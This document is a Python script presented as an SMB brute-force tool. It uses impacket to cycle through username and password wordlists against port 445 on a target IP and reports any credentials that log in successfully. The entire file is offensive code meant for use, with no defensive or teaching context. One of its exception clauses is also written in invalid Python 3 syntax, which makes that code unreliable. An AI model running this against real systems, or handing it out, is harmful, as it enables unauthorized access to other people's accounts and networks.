import argparse
import socket
from impacket.smbconnection import SMBConnection

# SMB Brute Force Tool
# MJTRK01



def check_target_connection(ip):

    print(f"[*] Checking Connection To {ip}...")
    try:
        with socket.create_connection((ip, 445), timeout=5) as conn:
            print(f"[+] Connection to {ip} Successful ...")
            return True
    except socket.timeout, socket.error as exp:
        print(f"[-] Unable to connect to {ip} : {exp}")
        return False

def brute_force_smb(ip_address, usernames_file, passwords_file):

    # Try reading files
    try:
        with open(usernames_file, 'r') as us_file:
            usernames = [line.strip() for line in us_file]
        with open(passwords_file, 'r') as ps_file:
            passwords = [line.strip() for line in ps_file]
    except Exception as exp:
        print(f"[!] Error Reading File: {exp}")
        return

    # Starting brute force
    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying {username}:{password} ...")
                smb = SMBConnection(ip_address, ip_address)
                smb.login(username, password)
                print(f"[+] Valid Credentials Found: {username}:{password}")
                smb.logoff()
                return
            except Exception as exp:
                if "STATUS_LOGON_FAILURE" in str(exp):
                    print(f"[-] Failed: {username}:{password}")
                else:
                    print(f"[!] Error: {exp}")
    print("[-] No Valid Credentials Found!")

if __name__ == "__main__":

    # Arguments Parsing
    parser = argparse.ArgumentParser(description="SMB Brute Force Tool")
    parser.add_argument("ip_address", help="Target IP Address")
    parser.add_argument("usernames_file", help="File Containing Usernames")
    parser.add_argument("passwords_file", help="File Containing Passwords")
    args = parser.parse_args()

    # Check The Target IP Connection and Running the brute force 
    if check_target_connection(args.ip_address):
        brute_force_smb(args.ip_address, args.usernames_file, args.passwords_file)
    else:
        print("[!] Exiting: Unable to reach IP Target.")
